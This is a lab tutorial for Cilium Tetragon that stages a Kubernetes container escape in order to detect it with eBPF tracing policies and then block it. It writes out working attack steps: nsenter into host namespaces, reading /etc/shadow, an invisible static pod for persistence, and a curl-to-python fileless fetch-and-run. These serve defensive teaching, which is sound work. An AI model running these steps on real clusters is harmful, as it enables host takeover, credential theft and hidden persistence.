The need for Security Observability

Security Observability in general is about providing more context into events involving an incident. We realize security observability by utilizing eBPF, a Linux kernel technology, to allow Security and DevOps teams, SREs, Cloud Engineers, and Solution Architects to gain real-time visibility into Kubernetes and workloads running on top of it. This helps them to secure their production environment.

 Cilium Tetragon

Cilium Tetragon is an open source Security Observability and Runtime Enforcement tool from the makers of Cilium. It captures different process and network event types through a user-supplied configuration to enable Security Observability on arbitrary hook points in the kernel; then translates these events into actionable signals for a Security Team.

A Standalone Project

While Tetragon is part of the Cilium project, it does not require Cilium or Hubble to run.

In this lab, you will install and use Tetragon on a Kubernetes cluster that doesn't use Cilium.

There is this lab!

And the best way to have your first experience with Cilium Tetragon is to walk through this lab, which takes the first part of the Real World Attack example out of the book and teaches you how to detect a container escape step by step:

    running a pod to gain root privileges
    escaping the pod onto the host
    persisting the attack with an invisible pod
    execute a fileless script in memory

Check that the Kind cluster is running:
kubectl get nodes

Install the open source Cilium Tetragon:
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon \
  -n kube-system -f tetragon.yaml --version 1.1.0


Cilium Tetragon is running as a daemonset which implements the eBPF logic for extracting the Security Observability events as well as event filtering, aggregation and export to external event collectors.

Wait until the Tetragon daemonset is successfully rolled out.
kubectl rollout status -n kube-system ds/tetragon -w
kubectl -n kube-system get pods -l app.kubernetes.io/name=tetragon-operator
NAME                                 READY   STATUS    RESTARTS   AGE
tetragon-operator-867595557c-q4glz   1/1     Running   0          74s


To be able to detect the Real World Attack scenario from the book, we will need three TracingPolicies that we will apply during the different challenges. TracingPolicy is a user-configurable Kubernetes custom resource definition (CRD) that allows you to trace arbitrary events in the kernel and define actions to take on match.

The first TracingPolicy is going to be used to monitor networking events and track network connections. In our case, we are going to observe tcp_connect, tcp_close and kernel functions to track when a TCP connection opens, closes respectively:
kubectl apply -f networking.yaml

Inspecting the Security Observability events by executing the following command:
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- tetra getevents -o compact
 connect kind-control-plane /usr/lib/systemd/systemd tcp 127.0.0.1:50338 -> 127.0.0.1:10257 🛑 CAP_SYS_ADMIN
🧹 close   kind-control-plane /usr/lib/systemd/systemd tcp 127.0.0.1:50338 -> 127.0.0.1:10257 🛑 CAP_SYS_ADMIN
🔌 connect kind-control-plane /usr/lib/systemd/systemd tcp 172.18.0.2:40670 -> 172.18.0.2:6443 🛑 CAP_SYS_ADMIN
🧹 close   kind-control-plane /usr/lib/systemd/systemd tcp 172.18.0.2:40670 -> 172.18.0.2:6443 🛑 CAP_SYS_ADMIN
🔌 connect kind-control-plane /usr/lib/systemd/systemd tcp 172.18.0.2:40672 -> 172.18.0.2:6443 🛑 CAP_SYS_ADMIN
🧹 close   kind-control-plane /usr/lib/systemd/systemd tcp 172.18.0.2:40672 -> 172.18.0.2:6443 🛑 CAP_SYS_ADMIN
process kind-control-plane /usr/local/sbin/runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/b578a8f7a4c99b205a94f7626a8cb56977ceb93b0f07111b6115cb9d44af3ee1/log.json --log-format json --systemd-cgroup exec --process /tmp/runc-process2750058109 --detach --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/b578a8f7a4c99b205a94f7626a8cb56977ceb93b0f07111b6115cb9d44af3ee1/605cf29f6518239ab6cee285247bc4d2c0ef6ccb948814810498253543c2cf54.pid b578a8f7a4c99b205a94f7626a8cb56977ceb93b0f07111b6115cb9d44af3ee1 🛑 CAP_SYS_ADMIN
🚀 process kind-control-plane /proc/self/exe init          🛑 CAP_SYS_ADMIN
🚀 process kind-control-plane /dev/fd/5 init               🛑 CAP_SYS_ADMIN


Detecting a container escape

This lab takes the first part of the Real World Attack out of the book and teaches you how to detect a container escape step by step. During the attack you will take advantage of a pod with an overly permissive configuration ("privileged" in Kubernetes) to enter into all the host namespaces with the nsenter command.

From there, you will write a static pod manifest in the /etc/kubernetes/manifests directory that will cause the kubelet to run that pod. Here you actually take advantage of a Kubernetes bug where you define a Kubernetes namespace that doesn’t exist for your static pod, which makes the pod invisible to the Kubernetes API server. This makes your stealthy pod invisible to kubectl commands.

After persisting the breakout by spinning up an invisible container, you are going to download and execute a malicious script in memory that never touches disk. Note that this simple python script represents a fileless malware which is almost impossible to detect by using traditional userspace tools.

The easiest way to perform a container escape is to spin up a pod with "privileged" in the pod spec. Kubernetes allows this by default and the privileged flag grants the container all Linux capabilities and access to host namespaces. The hostPID and hostNetwork flags run the container in the host PID and networking namespaces respectively, so it can interact directly with all processes and network resources on the node.

In the tab >_ Terminal 1 on the left side, start inspecting the Security Observability events again. This time we will specifically look for the events related to the pod named sith-infiltrator, where the attack is going to be performed.

kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- tetra getevents -o compact --pods sith-infiltrator

Now, let's switch >_ Terminal 2 and apply the privileged pod spec:
kubectl apply -f sith-infiltrator.yaml

In >_ Terminal 1, you can identify the sith-infiltrator container start on the default Kubernetes namespace with the following process_exec and process_exit events generated by Cilium Tetragon:
 kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon \
  -- tetra getevents -o compact --pods sith-infiltrator
🚀 process default/sith-infiltrator /kind/bin/mount-product-files.sh /kind/bin/mount-product-files.sh 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/jq -r .bundle 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/jq -r .bundle 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/cp /kind/product_name /kind/product_uuid /run/containerd/io.containerd.runtime.v2.task/k8s.io/4388c08293bf50813d8a8036e899cfb9a44c4e4b04562eaa99965713658cbd67/rootfs/ 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/cp /kind/product_name /kind/product_uuid /run/containerd/io.containerd.runtime.v2.task/k8s.io/4388c08293bf50813d8a8036e899cfb9a44c4e4b04562eaa99965713658cbd67/rootfs/ 0 🛑 CAP_SYS_ADMIN
process default/sith-infiltrator /docker-entrypoint.d/20-envsubst-on-templates.sh /docker-entrypoint.d/20-envsubst-on-templates.sh 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/20-envsubst-on-templates.sh 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/20-envsubst-on-templates.sh 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/awk  "END { for (name in ENVIRON) { print ( name ~ // ) ? name : "" } }" 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/awk  "END { for (name in ENVIRON) { print ( name ~ // ) ? name : "" } }" 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /docker-entrypoint.d/20-envsubst-on-templates.sh /docker-entrypoint.d/20-envsubst-on-templates.sh 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /docker-entrypoint.d/30-tune-worker-processes.sh /docker-entrypoint.d/30-tune-worker-processes.sh 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/30-tune-worker-processes.sh 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/30-tune-worker-processes.sh 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /docker-entrypoint.d/30-tune-worker-processes.sh /docker-entrypoint.d/30-tune-worker-processes.sh 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/sbin/nginx -g "daemon off;" 🛑 CAP_SYS_ADMIN

Since the privileged flag was set to true in the Pod specification, the pod gained all the Linux capabilities. As an example, CAP_SYS_ADMIN is printed in the end of each Security Observability event. CAP_SYS_ADMIN gives a highly privileged access level equivalent to root access, it allows to perform a range of system administration operations mount(2), umount(2), pivot_root(2), sethostname(2), setdomainname(2), setns(2), unshare(2) etc.

To be able to detect the privilege escalation from the book, we will need to apply the second TracingPolicy. This TracingPolicy is going to monitor the sys-setns system call, which is used by processes during changing kernel namespaces. In >_ Terminal 2, apply the TracingPolicy:
kubectl apply -f sys-setns.yaml

Now, let’s use >_ Terminal 2 and kubectl exec to get a shell in sith-infiltrator:
root@server:~# kubectl exec -it sith-infiltrator -- /bin/bash
root@kind-control-plane:/# nsenter -t 1 -a bash
root@kind-control-plane:/# cat /etc/shadow

In >_ Terminal 2 in our kubectl shell, let's use nsenter command to enter the host's namespace and run bash as root on the host:
nsenter -t 1 -a bash

In >_ Terminal 1, you can now observe the kubectl exec with the following process_exec event:
🚀 process default/sith-infiltrator /bin/bash              🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter cgroup         🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter ipc            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter uts            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter net            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter pid            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter mnt            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter time           🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/bash          🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/cat /etc/shadow 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/cat /etc/shadow 0 🛑 CAP_SYS_ADMIN

The nsenter command executes commands in specified namespaces. The first flag, -t defines the target namespace where the command will land. Every Linux machine runs a process with PID 1 which always runs in the host namespace. The other command line arguments define the other namespaces where the command also wants to enter, in this case, -a describes all the Linux namespaces, which are: cgroup, ipc, uts, net, pid, mnt, time.

So we break out from the container in every possible way and running the bash command as root on the host.
We can identify this container escape by observing two process_exec and seven process_kprobe events in >_ Terminal 1. The first process_exec event is the nsenter command with the namespace command-line arguments:
 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash


The following seven process_kprobe events observe the sys-setns system call which was invoked every time there was a kernel namespace change. This shows how we entered into the cgroup, ipc, uts, net, pid, mnt, time host namespaces.

Maintain foothold

As a second stage, we can try to create foothold and persistence on the node. Since we have unfettered access to node resources, we can drop a custom hidden pod spec and launch an invisible pod!

Cilium Tetragon provides an enforcement framework called TracingPolicy. TracingPolicy is a user-configurable Kubernetes custom resource definition (CRD) that allows you to trace arbitrary events in the kernel and define actions to take on match.

TracingPolicy is fully Kubernetes Identity Aware, so it can enforce on arbitrary kernel events and system calls after the Pod has reached a ready state. This allows you to prevent system calls that are required by the container runtime but should be restricted at application runtime. You can also make changes to the TracingPolicy that dynamically update the eBPF programs in the kernel without needing to restart your application or node.

Once there is an event triggered by a TracingPolicy and the corresponding signature, you can either send an alert to a Security Analyst or prevent the behaviour with a SIGKILL signal to the process.

To be able to detect creating an invisible Pod, we will need to apply the third TracingPolicy. This TracingPolicy is going to be used to monitor read and write access to sensitive files. In our case, we are going to observe the __x64_sys_write and __x64_sys_read system calls which are executed on the files under the /etc/kubernetes/manifests directory. In >_ Terminal 2, apply the manifest:

cat sys-write-etc-kubernetes-manifests.yaml 
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "file-write-etc-kubernetes-manifests"
spec:
  podSelector:
    matchLabels:
     org: empire
  options:
  - name: "disable-kprobe-multi"
    value: "1"
  kprobes:
  - call: "security_file_permission"
    syscall: false
    args:
    - index: 0
      type: "file" # (struct file *) used for getting the path
    - index: 1
      type: "int" # 0x04 is MAY_READ, 0x02 is MAY_WRITE
    selectors:
    - matchArgs:      
      - index: 0
        operator: "Prefix"
        values:
        - "/etc/kubernetes/manifests"

kubectl apply -f sys-write-etc-kubernetes-manifests.yaml

Now let's try to create foothold and persistence on the node. First, in >_ Terminal 1 let's monitor the generated Security Observability events like we did before.

kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator

In >_ Terminal 2 let's kubectl exec into the sith-infiltrator:
kubectl exec -it sith-infiltrator -- /bin/bash

and then enter to the node again:
nsenter -t 1 -a bash

Now that you have unfettered access to the node resources, let's cd into the /etc/kubernetes/manifests directory and check the existing content:
cd /etc/kubernetes/manifests/
ls -la

Then drop a custom hidden PodSpec:
cat << EOF > hack-latest.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hack-latest
  hostNetwork: true
  # define in namespace that doesn't exist so
  # workload is invisible to the API server
  namespace: doesnt-exist
spec:
  containers:
  - name: hack-latest
    image: sublimino/hack:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 10;done"]
    securityContext:
      privileged: true
EOF

As a validation, let's run crictl ps and see that a new container hack-latest is running on the node. Note that it might take a few seconds for the hack-latest container to show up:
root@kind-control-plane:/etc/kubernetes/manifests# crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                      ATTEMPT             POD ID              POD
20b24932aba13       e7ba4f2341d9d       12 seconds ago      Running             hack-latest               0                   11331d5330816       hack-latest-kind-control-plane

Now, that you have written your hidden PodSpec to kubelet’s directory, you can verify that the pod is invisible to the Kubernetes API server in >_ Terminal 3 by running:
kubectl get pods --all-namespaces

Note that the container hack-latest is not visible in the output!

However, it can be identified by Cilium Tetragon. By monitoring Security Observability events from Cilium Tetragon in >_ Terminal 1, you can identify persistence early by detecting the hack-latest.yaml file write with /usr/bin/cat in the following process_exec and process_kprobe events

kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator
🚀 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter cgroup         🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter ipc            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter uts            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter net            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter pid            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter mnt            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter time           🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/bash          🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /bin/bash              🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/ls -la        🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/ls -la 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/cat           🛑 CAP_SYS_ADMIN
📝 write   default/sith-infiltrator /usr/bin/cat /etc/kubernetes/manifests/hack-latest.yaml 🛑 CAP_SYS_ADMIN
📝 write   default/sith-infiltrator /usr/bin/cat /etc/kubernetes/manifests/hack-latest.yaml 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/cat  0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/local/bin/crictl ps 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/local/bin/crictl ps 0 🛑 CAP_SYS_ADMIN


Execute a malicious python script in memory

We have persisted the breakout by spinning up an invisible container, now we can download and execute a malicious script in memory that never touches disk.

For this we are using a simple python script as a fileless malware which is almost impossible to detect by using traditional userspace tools.

Now, that you actually have persisted the breakout by spinning up an invisible container, you can download and execute a malicious script in memory that never touches disk. Note that this simple python script can be a fileless malware which is almost impossible to detect by using traditional userspace tools.

First, in >_ Terminal 1 let's monitor the generated Security Observability events like we did before.
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator

In >_ Terminal 3 let's enter to the sith-infiltrator:
kubectl exec -it sith-infiltrator -- /bin/bash
nsenter -t 1 -a bash
CONT_ID=$(crictl ps --name hack-latest --output json | jq -r '.containers[0].id')
echo $CONT_ID
crictl exec -it $CONT_ID /bin/bash

In the logs in >_ Terminal 1 the first process_exec event shows the bash execution in a container with a container id (for example 24220f07dacc), which is the invisible hack-latest container.

Note that due to ringbuffer/latency reasons it sometimes can take a moment or two until certain log messages appear!
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator
🚀 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter cgroup         🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter ipc            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter uts            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter net            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter pid            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter mnt            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter time           🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/bash          🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/local/bin/crictl ps --name hack-latest --output json 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/jq -r .containers[0].id 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/local/bin/crictl ps --name hack-latest --output json 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/jq -r .containers[0].id 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/bash  0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /bin/bash              🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/local/bin/crictl exec -it 20b24932aba135e380556db4e1b3189ab2a0f3afe1e56ca4f68baa4f21366b35 /bin/bash 🛑 CAP_SYS_ADMIN
🔌 connect default/sith-infiltrator /usr/local/bin/crictl tcp 127.0.0.1:40122 -> 127.0.0.1:39285 🛑 CAP_SYS_ADMIN

To be able to fine grain the Security Observability events from Cilium Tetragon, start monitoring the events that match process names curl or python in >_ Terminal 2:
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --processes curl,python

Then, in >_ Terminal 3 download a malicious python script and execute it in memory:
curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py | python

By using Cilium Tetragon you are able to follow the final movements of the attack.

After about a minute, in the logs in >_ Terminal 2, the process_exec event shows the sensitive curl command with the arguments of https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --processes curl,python
🚀 process kind-control-plane /usr/bin/curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py 🛑 CAP_SYS_ADMIN
🚀 process kind-control-plane /usr/bin/python              🛑 CAP_SYS_ADMIN

You can also identify the sensitive socket connection opened via curl with the following destination IP 185.199.110.133 and port 443:
🔌 connect kind-control-plane /usr/bin/curl tcp 10.244.0.6:33842 -> 185.199.110.133:443 🛑 CAP_SYS_ADMIN
🧹 close   kind-control-plane /usr/bin/curl tcp 10.244.0.6:33842 -> 185.199.110.133:443 🛑 CAP_SYS_ADMIN

While the following process_exit events show the malicious python script execution in memory is finished with exit code 0, which means it was successful:
💥 exit    kind-control-plane /usr/bin/curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py 0 🛑 CAP_SYS_ADMIN
💥 exit    kind-control-plane /usr/bin/python  0  🛑 CAP_SYS_ADMIN


Enforcing Security Policies

Being able to observe security events directly in the Kernel and report them is great, but would it be possible to actually prevent them just as they happen?

This is what Tetragon Policy Enforcement is about!
We've seen that we could detect attacker actions with Tetragon. But could we have avoided them as well?

In this scenario, we really started getting in trouble when the attacker managed to write the hack-latest.yaml file in /etc/kubernetes/manifests on the node.

Using,the </> Editor, edit the sys-write-etc-kubernetes-manifests.yaml manifest and add an action at the end of the spec.kprobes.selectors section:
matchActions:
- action: Override
  argError: -1

This will make calls to the kernel for reading or writing files in /etc/kubernetes/manifests fail.

The matchActions section can be used to specify the action Tetragon should apply when an event occurs. It takes various possible actions, among which:

    Sigkill to kill the process immediately
    Override to override the function return arguments
    Signal to send a signal to the process
    GetUrl to send a GET request to a known URL

In this example, we will use the Override action.

Next, update the policy in the >_ Terminal 1:
kubectl apply -f sys-write-etc-kubernetes-manifests.yaml
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator

And execute a shell in the sith-infiltrator pod again in >_ Terminal 2:
root@server:~# kubectl exec -it sith-infiltrator -- /bin/bash
root@kind-control-plane:/# nsenter -t 1 -a bash
root@kind-control-plane:/# cd /etc/kubernetes/manifests/
ls -la
ls: reading directory '.': Operation not permitted
total 0


Check the logs in the >_ Terminal 1 tab again:
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon --   tetra getevents -o compact --pods sith-infiltrator
🚀 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter cgroup         🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter ipc            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter uts            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter net            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter pid            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter mnt            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter time           🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/bash          🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/ls -la        🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/ls -la 2 🛑 CAP_SYS_ADMIN

You can see that the ls -la command returned with status 2.

Note

The enforcement is applied directly in the Kernel, without any action from a user-space program, as the eBPF program generated by Tetragon is self-sufficient to both monitor and enforce.
Similar rules could be written to:

    block binary execution by command name (to avoid the curl for example)
    prevent the original NS escape that allowed access to the host namespace
    etc.
